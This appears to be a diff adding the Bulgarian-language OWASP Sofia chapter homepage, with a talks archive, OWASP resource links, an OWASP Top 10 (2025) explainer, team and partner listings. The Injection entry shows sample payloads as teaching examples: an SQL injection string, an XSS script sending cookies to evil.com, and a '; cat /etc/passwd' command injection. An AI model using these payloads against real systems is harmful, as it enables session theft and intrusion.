+                    <td><a href="./assets/presentations/202503%20-%20Coordinating%20Defense:%20My%20take%20on%20effective%20security%20testing%20strategies%20by%20Dimo%20Stankov.pdf">Coordinating Defense: My take on effective security testing strategies</a></td>
+                    <td><a href="https://www.linkedin.com/in/dimo-stankov/" target="_blank" rel="noopener" class="author-link">Dimo Stankov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://www.youtube.com/watch?v=4ImaeQ2UR-A" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>21.03.2025</td>
+                    <td><a href="./assets/presentations/202503%20-%20Secure%20Software%20Development:%20Overview%20and%20practical%20examples%20by%20Radostina%20Kondakova.pdf">Secure Software Development: Overview and practical examples</a></td>
+                    <td><a href="https://www.linkedin.com/in/radostina-kondakova-0ab34a151/" target="_blank" rel="noopener" class="author-link">Radostina Kondakova <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://www.youtube.com/watch?v=4ImaeQ2UR-A" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>21.03.2025</td>
+                    <td><a href="./assets/presentations/202503%20-%20Broken%20Access%20Control:%20Tackling%20OWASP's%20#1%20Vulnerability%20by%20Spas%20Genov.pdf">Broken Access Control: Tackling OWASP's #1 Vulnerability</a></td>
+                    <td><a href="https://www.linkedin.com/in/spas-genov/" target="_blank" rel="noopener" class="author-link">Spas Genov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://www.youtube.com/watch?v=4ImaeQ2UR-A" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>31.01.2025</td>
+                    <td><a href="./assets/presentations/202501%20-%20OS%20Command%20Injection%20via%20CRLF%20Injection%20in%20SNMP%20Services%20by%20Peter%20Djalaliev.pdf">OS Command Injection via CRLF Injection in SNMP Services</a></td>
+                    <td><a href="https://www.linkedin.com/in/pdjalaliev/" target="_blank" rel="noopener" class="author-link">Peter Djalaliev <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://www.youtube.com/watch?v=KeyTtB0FVJw" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>31.01.2025</td>
+                    <td><a href="./assets/presentations/202501%20-%20Active%20Directory%20Exploitation%20by%20Lyuben%20Petrov.pdf">Active Directory Exploitation</a></td>
+                    <td><a href="https://www.linkedin.com/in/lyuben-petrov-b287bb236/" target="_blank" rel="noopener" class="author-link">Lyuben Petrov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://www.youtube.com/watch?v=KeyTtB0FVJw" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>31.01.2025</td>
+                    <td><a href="./assets/presentations/202501%20-%20Authentication%20Gone%20Bad%20-%20Penetration%20Testing%20Techniques%20for%20Chaining%20Vulnerabilities%20by%20Milcho%20Hekimov.pdf">Authentication Gone Bad: Penetration Testing Techniques for Chaining Vulnerabilities</a></td>
+                    <td><a href="https://www.linkedin.com/in/milcho-hekimov/" target="_blank" rel="noopener" class="author-link">Milcho Hekimov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://www.youtube.com/watch?v=KeyTtB0FVJw" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+
+                <!-- 2024 -->
+                <tr class="year-row"><td colspan="4">2024</td></tr>
+                <tr>
+                    <td>13.12.2024</td>
+                    <td><a href="./assets/presentations/202412%20-%20OWASP%20Top%2010%20attacks%20&%20defenses%20by%20Nikolay%20Dimitrov.pdf">OWASP Top 10 attacks &amp; defenses</a></td>
+                    <td><a href="https://www.linkedin.com/in/nikolay-dimitrov-a26781b9/" target="_blank" rel="noopener" class="author-link">Nikolay Dimitrov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td>&mdash;</td>
+                </tr>
+                <tr>
+                    <td>13.12.2024</td>
+                    <td><a href="./assets/presentations/202412%20-%20How%20did%20I%20end%20up%20in%20your%20car%20by%20Zdravko%20Zdravkov.pdf">How did I end up in your car</a></td>
+                    <td>Zdravko Zdravkov</td>
+                    <td>&mdash;</td>
+                </tr>
+                <tr>
+                    <td>18.10.2024</td>
+                    <td><a href="./assets/presentations/202410%20-%20Is%20data%20strategy%20needed%20by%20Svetlana%20Videnova.pdf">Is a Data strategy needed?</a></td>
+                    <td><a href="https://www.linkedin.com/in/lana-videnova/" target="_blank" rel="noopener" class="author-link">Svetlana Videnova <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://drive.google.com/file/d/1tK1zElxio0XrKnJHnIk0wI__ugkZ_9Hn/view?usp=sharing" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>18.10.2024</td>
+                    <td><a href="./assets/presentations/202410%20-%20API%20security%20in%20the%20age%20of%20AI%20by%20Evgeni%20Dyulgerov.pdf">API Security in the age of AI</a></td>
+                    <td><a href="https://www.linkedin.com/in/evgeni-dyulgerov/" target="_blank" rel="noopener" class="author-link">Evgeni Dyulgerov <svg class="icon-svg-sm"><use href="#icon-linkedin"/></svg></a></td>
+                    <td><a href="https://drive.google.com/file/d/12mVBOYYiC4Nk-BZOXTCqEA4zxn83MIqN/view?usp=sharing" target="_blank" rel="noopener" class="badge badge-video">Video</a></td>
+                </tr>
+
+                <!-- 2022 -->
+                <tr class="year-row"><td colspan="4">2022</td></tr>
+                <tr>
+                    <td>28.06.2022</td>
+                    <td>Why hackers love Javascript?</td>
+                    <td>Martin Stoynov</td>
+                    <td>&mdash;</td>
+                </tr>
+
+                <!-- 2021 -->
+                <tr class="year-row"><td colspan="4">2021</td></tr>
+                <tr>
+                    <td>31.07.2021</td>
+                    <td>AppSec Fast and Slow: Your DevSecOps CI/CD Pipeline Isn't an SSA Program</td>
+                    <td>Dan Cornell</td>
+                    <td>
+                        <a href="#" class="badge badge-video">Video</a>
+                        <a href="#" class="badge badge-slides">Slides</a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>21.07.2021</td>
+                    <td>Understanding AWS cloud attacks using CloudGoat</td>
+                    <td>Kavisha Sheth</td>
+                    <td><a href="#" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>21.07.2021</td>
+                    <td>Learn Android application security testing using AndroGoat</td>
+                    <td>Satish Patnayak</td>
+                    <td><a href="#" class="badge badge-video">Video</a></td>
+                </tr>
+                <tr>
+                    <td>27.04.2021</td>
+                    <td>XSS Attacks and Defenses</td>
+                    <td>Dimitar Boyanov</td>
+                    <td>
+                        <a href="#" class="badge badge-video">Video</a>
+                        <a href="#" class="badge badge-slides">Slides</a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>27.03.2021</td>
+                    <td>Compromising Modern Online Banking Apps through Hijacking Android Devices</td>
+                    <td>Dr. Svetlin Nakov</td>
+                    <td><a href="#" class="badge badge-slides">Slides</a></td>
+                </tr>
+
+                <!-- 2019 -->
+                <tr class="year-row"><td colspan="4">2019</td></tr>
+                <tr>
+                    <td>27.06.2019</td>
+                    <td>Pros &amp; Cons of Penetration Testing</td>
+                    <td>Atanas Pashov</td>
+                    <td><a href="#" class="badge badge-slides">Slides</a></td>
+                </tr>
+                <tr>
+                    <td>09.05.2019</td>
+                    <td>Penetration Testing: OSINT</td>
+                    <td>Angel Bochev</td>
+                    <td>
+                        <a href="#" class="badge badge-video">Video</a>
+                        <a href="#" class="badge badge-slides">Slides</a>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</section>
+
+<!-- ===== Ресурси ===== -->
+<section id="ресурси">
+    <div class="container">
+        <h2 class="section-title">Ресурси</h2>
+        <p class="section-desc">Ключови OWASP проекти и материали &mdash; част от тях преведени на български.</p>
+        <div class="resources-grid">
+            <div class="resource-card">
+                <h3>OWASP ASVS</h3>
+                <p>Application Security Verification Standard &mdash; рамка за тестване на сигурността на уеб приложения и определяне на изисквания.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-application-security-verification-standard/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP Testing Guide</h3>
+                <p>Изчерпателно ръководство за тестване на сигурността на уеб приложения с практически методологии и техники.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP Cheat Sheet Series</h3>
+                <p>Колекция от кратки и практични ръководства по конкретни теми в сигурността на приложенията.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP SAMM</h3>
+                <p>Software Assurance Maturity Model &mdash; модел за оценка и подобряване на практиките за сигурност в софтуерната разработка.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owaspsamm.org/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP ZAP</h3>
+                <p>Безплатен инструмент с отворен код за автоматизирано тестване на сигурността на уеб приложения.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://www.zaproxy.org/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP Mobile Application Security</h3>
+                <p>Стандарт и ръководство за тестване на сигурността на мобилни приложения (MASVS и MASTG).</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-mobile-app-security/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP Dependency-Check</h3>
+                <p>Инструмент за Software Composition Analysis (SCA) &mdash; открива публично известни уязвимости в зависимостите на проекта.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-dependency-check/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP Juice Shop</h3>
+                <p>Умишлено уязвимо уеб приложение за обучение и практика по сигурност &mdash; идеално за CTF и workshops.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP AI Security</h3>
+                <p>Ръководства и стандарти за сигурност на AI/ML системи &mdash; заплахи, атаки и защита на модели и данни.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owaspai.org/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP API Security</h3>
+                <p>Top 10 рискове за сигурността на API &mdash; специализиран списък за REST, GraphQL и други API архитектури.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-api-security/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP ModSecurity Core Rule Set</h3>
+                <p>Набор от правила за Web Application Firewall (WAF) &mdash; защита от injection, XSS и други атаки на ниво HTTP трафик.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-modsecurity-core-rule-set/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+            <div class="resource-card">
+                <h3>OWASP Amass</h3>
+                <p>Инструмент за мрежово картографиране и discovery на attack surface &mdash; DNS enumeration, ASN discovery и OSINT.</p>
+                <span class="lang-badge lang-en">EN English</span>
+                <a href="https://owasp.org/www-project-amass/" target="_blank" rel="noopener" class="link">Научи повече &rarr;</a>
+            </div>
+        </div>
+
+        <!-- OWASP Top 10 (2025) Accordion -->
+        <div id="top10" style="margin-top: 48px; scroll-margin-top: 80px;">
+            <h3 class="section-title" style="font-size: 1.4rem;">OWASP Top 10 (2025)</h3>
+            <p class="section-desc">
+                Списъкът на десетте най-критични класа уязвимости в уеб приложенията &mdash;
+                актуализиран на всеки 3&ndash;4 години. Спрямо 2021: SSRF отпада, влиза новата
+                категория за грешна обработка на изключения. Редът значително се е променил.
+                <a href="https://owasp.org/Top10/2025/" target="_blank" rel="noopener">Пълен списък (EN) &rarr;</a>
+            </p>
+            <div class="accordion">
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A01</span> Broken Access Control
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Потребители достъпват ресурси извън правата си. Запазва позицията си като най-честата уязвимост.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> IDOR (Insecure Direct Object Reference) &mdash; промяна на <code>/api/user/123</code> на <code>/api/user/456</code> за достъп до чужд акаунт. Privilege escalation &mdash; обикновен потребител достъпва администраторски панел. Липсващи authorization checks на API endpoints.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Прилагайте deny-by-default подход. Проверявайте правата на сървъра при всяка заявка. Използвайте RBAC (Role-Based Access Control). Деактивирайте directory listing. Логвайте и алертирайте при повтарящи се неуспешни опити за достъп.</p>
+                        <a href="https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A02</span> Security Misconfiguration
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Прескача от A05 на A02. Изключително честа в облачни среди поради сложността на конфигурацията.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> Default credentials оставени в production (<code>admin/admin</code>). Излишни услуги и портове отворени. Verbose error messages, разкриващи stack traces. Публично достъпен S3 bucket. XXE (XML External Entity) атаки чрез некоректно конфигуриран XML parser.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Автоматизирайте hardening процесите. Премахвайте ненужни features и frameworks. Преглеждайте cloud permissions редовно. Използвайте Infrastructure as Code със security scanning. Деактивирайте XML external entity processing.</p>
+                        <a href="https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A03</span> Software Supply Chain Failures
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Еволюция на &bdquo;Vulnerable Components&ldquo; &mdash; разширена до цялата верига на доставки на софтуер.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> Злонамерени пакети в npm/PyPI (typosquatting &mdash; <code>loadash</code> вместо <code>lodash</code>). Компрометирани CI/CD pipelines &mdash; атакуващ инжектира код в build процеса. XZ Utils backdoor (CVE-2024-3094) &mdash; злонамерен код вграден в популярна compression библиотека.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Поддържайте Software Bill of Materials (SBOM). Използвайте lock files и проверявайте integrity hashes. Сканирайте зависимостите с SCA инструменти (Dependabot, Snyk). Подписвайте артефактите с Sigstore/cosign. Ограничете достъпа до CI/CD pipeline конфигурации.</p>
+                        <a href="https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A04</span> Cryptographic Failures
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Слизане от A02 на A04. Чувствителни данни, предавани или съхранявани без адекватно криптиране.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> Пароли хеширани с MD5 или SHA-1 вместо bcrypt/Argon2. Липса на HTTPS &mdash; данни предавани в plaintext. Слаби TLS конфигурации (TLS 1.0/1.1). Hardcoded API ключове и secrets в сорс кода. Sensitive data в URL параметри, видими в server logs.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Криптирайте данните at rest и in transit. Използвайте TLS 1.2+ с модерни cipher suites. Хеширайте пароли с bcrypt, scrypt или Argon2id. Генерирайте ключове с CSPRNG. Не съхранявайте чувствителни данни без нужда. Управлявайте secrets чрез vault системи.</p>
+                        <a href="https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A05</span> Injection
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Невалидирани входни данни, интерпретирани като команди. Слиза от A03 на A05, но остава изключително опасна.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> SQL Injection &mdash; <code>' OR 1=1 --</code> в login форма. XSS (Cross-Site Scripting) &mdash; <code>&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code>. OS Command Injection &mdash; <code>; cat /etc/passwd</code> в input поле. LDAP injection в корпоративни директории.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Използвайте параметризирани заявки (prepared statements) винаги. Прилагайте input validation с allowlists. Escape-вайте output според контекста (HTML, JS, SQL). Използвайте ORM frameworks. Прилагайте Content Security Policy (CSP) за XSS защита.</p>
+                        <a href="https://owasp.org/Top10/2025/A05_2025-Injection/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A06</span> Insecure Design
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Проблемите в архитектурата не могат да се поправят само с добра имплементация &mdash; трябват фундаментални промени в дизайна.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> Password recovery чрез &bdquo;security questions&ldquo; с лесно достъпни отговори. Липса на rate limiting на критични операции (password reset, SMS verification). Бизнес логика, позволяваща купуване на продукти с отрицателна цена. API без pagination, позволяващ dump на цялата база.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Прилагайте threat modeling (STRIDE, PASTA) при проектиране. Дефинирайте security requirements от началото. Използвайте secure design patterns и reference architectures. Включвайте abuse cases и negative testing в QA процеса. Прилагайте principle of least privilege в архитектурата.</p>
+                        <a href="https://owasp.org/Top10/2025/A06_2025-Insecure_Design/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A07</span> Authentication Failures
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Слабости в механизмите за удостоверяване на самоличността. Остава на A07 с леко разширен обхват.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> Credential stuffing &mdash; автоматизирано тестване на откраднати username/password двойки. Липса на MFA за критични операции. Session fixation &mdash; атакуващ задава session ID преди автентикация. JWT tokens без expiration или с <code>alg: none</code>. Пароли без минимална сложност.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Имплементирайте MFA (multi-factor authentication). Използвайте rate limiting и account lockout. Генерирайте нов session ID след login. Валидирайте JWT с правилен алгоритъм и expiration. Интегрирайте проверка срещу списъци с компрометирани пароли (Have I Been Pwned API).</p>
+                        <a href="https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A08</span> Software or Data Integrity Failures
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Код и инфраструктура, които не проверяват целостта на софтуера и данните.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> SolarWinds Orion &mdash; компрометиран build процес инжектира backdoor в легитимен софтуер. XZ Utils (CVE-2024-3094) &mdash; злонамерен maintainer вгражда backdoor. Insecure deserialization &mdash; <code>ObjectInputStream.readObject()</code> без validation. Auto-update механизъм без проверка на цифров подпис.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Подписвайте и верифицирайте всички software updates. Защитете CI/CD pipeline с access controls и audit logs. Избягвайте deserialization на untrusted данни. Използвайте Subresource Integrity (SRI) за CDN ресурси. Мониторирайте зависимостите за known vulnerabilities.</p>
+                        <a href="https://owasp.org/Top10/2025/A08_2025-Software_and_Data_Integrity_Failures/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A09</span> Security Logging and Alerting Failures
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Липса на адекватно логване и алерти при аномалии. Атаките остават незабелязани средно 207 дни.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> Неуспешни login опити не се логват &mdash; brute force атаките остават незабелязани. Логове без timestamps или source IP. Липса на алерти при масово изтегляне на данни (data exfiltration). Логове съхранявани само локално &mdash; атакуващ ги изтрива. Sensitive данни (пароли, tokens) записани в логове.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Логвайте всички authentication, access control и input validation грешки. Изпращайте логовете към централизирана SIEM система. Настройте алерти за подозрителни модели (multiple failed logins, unusual data access). Не логвайте sensitive данни. Дефинирайте incident response план и тествайте го редовно.</p>
+                        <a href="https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="acc-code">A10</span> Mishandling of Exceptional Conditions
+                        <span class="acc-arrow">&#9660;</span>
+                    </button>
+                    <div class="accordion-body">
+                        <p>Нова за 2025. Заменя SSRF. Неправилна обработка на грешки и изключителни ситуации, водещи до непредвидено поведение.</p>
+                        <p style="margin-top:10px;"><strong>Примери:</strong> Null pointer dereference, причиняващ crash на критичен сървис. Race conditions при финансови транзакции &mdash; double spending. Необработени изключения, разкриващи вътрешна информация за системата. Timeout failures, оставящи ресурси в inconsistent state. Off-by-one errors в boundary checks.</p>
+                        <p style="margin-top:10px;"><strong>Препоръчани мерки:</strong> Имплементирайте comprehensive error handling за всички code paths. Използвайте generic error messages за потребителите. Прилагайте defensive programming &mdash; валидирайте assumptions. Тествайте с fuzzing и chaos engineering. Използвайте mutex/locks за предотвратяване на race conditions. Дефинирайте graceful degradation стратегии.</p>
+                        <a href="https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/" target="_blank" rel="noopener">Прочети повече &rarr;</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== Екип ===== -->
+<section id="екип">
+    <div class="container">
+        <h2 class="section-title">Екип</h2>
+        <p class="section-desc">Настоящите лидери на OWASP Sofia.</p>
+        <div class="leaders-grid">
+            <div class="leader-card">
+                <div class="leader-icon">ME</div>
+                <h3>Miglen Evlogiev</h3>
+                <p>Chapter Leader</p>
+                <div class="leader-links">
+                    <a href="https://www.linkedin.com/in/miglen/" target="_blank" rel="noopener" title="LinkedIn">
+                        <svg class="icon-svg"><use href="#icon-linkedin"/></svg>
+                    </a>
+                    <a href="https://miglen.com" target="_blank" rel="noopener" title="Website">
+                        <svg class="icon-svg"><use href="#icon-web"/></svg>
+                    </a>
+                    <a href="https://github.com/miglen" target="_blank" rel="noopener" title="GitHub">
+                        <svg class="icon-svg"><use href="#icon-github"/></svg>
+                    </a>
+                    <a href="mailto:miglen.evlogiev@owasp.org" title="Email">
+                        <svg class="icon-svg"><use href="#icon-email"/></svg>
+                    </a>
+                </div>
+            </div>
+            <div class="leader-card">
+                <div class="leader-icon">TT</div>
+                <h3>Todor Todorov</h3>
+                <p>Chapter Leader</p>
+                <div class="leader-links">
+                    <a href="https://www.linkedin.com/in/totollygeek/" target="_blank" rel="noopener" title="LinkedIn">
+                        <svg class="icon-svg"><use href="#icon-linkedin"/></svg>
+                    </a>
+                    <a href="https://todorov.bg/" target="_blank" rel="noopener" title="Website">
+                        <svg class="icon-svg"><use href="#icon-web"/></svg>
+                    </a>
+                    <a href="https://github.com/totollygeek" target="_blank" rel="noopener" title="GitHub">
+                        <svg class="icon-svg"><use href="#icon-github"/></svg>
+                    </a>
+                    <a href="mailto:todor.todorov@owasp.org" title="Email">
+                        <svg class="icon-svg"><use href="#icon-email"/></svg>
+                    </a>
+                </div>
+            </div>
+            <div class="leader-card">
+                <div class="leader-icon">MS</div>
+                <h3>Martin Stoynov</h3>
+                <p>Chapter Leader</p>
+                <div class="leader-links">
+                    <a href="https://www.linkedin.com/in/martinstnv/" target="_blank" rel="noopener" title="LinkedIn">
+                        <svg class="icon-svg"><use href="#icon-linkedin"/></svg>
+                    </a>
+                    <a href="https://martinstnv.com/" target="_blank" rel="noopener" title="Website">
+                        <svg class="icon-svg"><use href="#icon-web"/></svg>
+                    </a>
+                    <a href="https://github.com/martinstnv" target="_blank" rel="noopener" title="GitHub">
+                        <svg class="icon-svg"><use href="#icon-github"/></svg>
+                    </a>
+                    <a href="mailto:martin.stoynov@owasp.org" title="Email">
+                        <svg class="icon-svg"><use href="#icon-email"/></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== Партньори ===== -->
+<section id="партньори">
+    <div class="container">
+        <h2 class="section-title">Приятелски организации</h2>
+        <p class="section-desc">Организации и общности, с които споделяме мисия и ценности.</p>
+        <div class="partners-grid">
+            <a href="https://xakep.bg/" target="_blank" rel="noopener" class="partner-card">
+                <h3>XaKeP.bg</h3>
+                <p>Българска общност за етично хакерство, изследвания и споделяне на знания в киберсигурността.</p>
+            </a>
+            <a href="https://cybersecuritytalks.bg/" target="_blank" rel="noopener" class="partner-card">
+                <h3>Cyber Security Talks</h3>
+                <p>Месечни срещи за киберсигурност в България &mdash; специалисти, институции и ентусиасти споделят опит и идеи.</p>
+            </a>
+            <a href="https://csf.bg/" target="_blank" rel="noopener" class="partner-card">
+                <h3>Cyber Security Forum (CSF)</h3>
+                <p>Българска фондация за киберсигурност &mdash; образование, кариерно развитие и професионална мрежа.</p>
+            </a>
+            <a href="https://securitybsides.bg/" target="_blank" rel="noopener" class="partner-card">
+                <h3>BSides Sofia</h3>
+                <p>Конференция за информационна сигурност в София &mdash; част от глобалната BSides общност.</p>
+            </a>
+            <a href="https://isaca-sofia.org/" target="_blank" rel="noopener" class="partner-card">
+                <h3>ISACA Sofia Chapter</h3>
+                <p>Софийският клон на ISACA &mdash; одит, управление на риска и информационна сигурност.</p>
+            </a>
+            <a href="https://cybersecbg.org/" target="_blank" rel="noopener" class="partner-card">
+                <h3>Българска Асоциация по Киберсигурност</h3>
+                <p>Професионална организация за развитие на киберсигурността в България чрез образование и сътрудничество.</p>
+            </a>
+        </div>
+    </div>
+</section>
+
+<!-- ===== Контакти ===== -->
+<section id="контакти">
+    <div class="container">
+        <h2 class="section-title">Контакти и общност</h2>
+        <p class="section-desc">Свържете се с нас или се присъединете към общността.</p>
+        <div class="contact-links">
+            <a href="https://www.meetup.com/OWASP-Sofia-Chapter/" target="_blank" rel="noopener" class="contact-card">
+                <div class="icon">&#128197;</div>
+                <h3>Meetup</h3>
+                <p>Събития и регистрация</p>
+            </a>
+            <a href="https://discord.com/channels/849266967856414731/981867323298312223" target="_blank" rel="noopener" class="contact-card">
+                <div class="icon">&#128172;</div>
+                <h3>Discord</h3>
+                <p>Чат с общността</p>
+            </a>
+            <a href="https://owasp.org/slack/invite" target="_blank" rel="noopener" class="contact-card">
+                <div class="icon"><svg class="icon-svg" style="width:32px;height:32px;"><use href="#icon-slack"/></svg></div>
+                <h3>Slack</h3>
+                <p>#chapter-sofia</p>
+            </a>
+            <a href="https://sessionize.com/owasp-sofia/" target="_blank" rel="noopener" class="contact-card">
+                <div class="icon">&#127908;</div>
+                <h3>Sessionize</h3>
+                <p>Предложи презентация</p>
+            </a>
+            <a href="https://www.linkedin.com/company/107314221/" target="_blank" rel="noopener" class="contact-card">
+                <div class="icon"><svg class="icon-svg" style="width:32px;height:32px;"><use href="#icon-linkedin"/></svg></div>
+                <h3>LinkedIn</h3>
+                <p>Следвайте ни</p>
+            </a>
+            <a href="https://www.facebook.com/owaspbg" target="_blank" rel="noopener" class="contact-card">
+                <div class="icon"><svg class="icon-svg" style="width:32px;height:32px;"><use href="#icon-facebook"/></svg></div>
+                <h3>Facebook</h3>
+                <p>Следвайте ни</p>
+            </a>
+        </div>
+    </div>
+</section>
+
+<!-- ===== Footer ===== -->
+<footer>
+    <div class="container">
+        <div class="footer-inner" style="align-items: start;">
+            <div style="max-width: 600px;">
+                <p>&copy; 2019&ndash;2026 OWASP Sofia Chapter. Част от <a href="https://owasp.org/" target="_blank" rel="noopener">OWASP Foundation, Inc.</a></p>
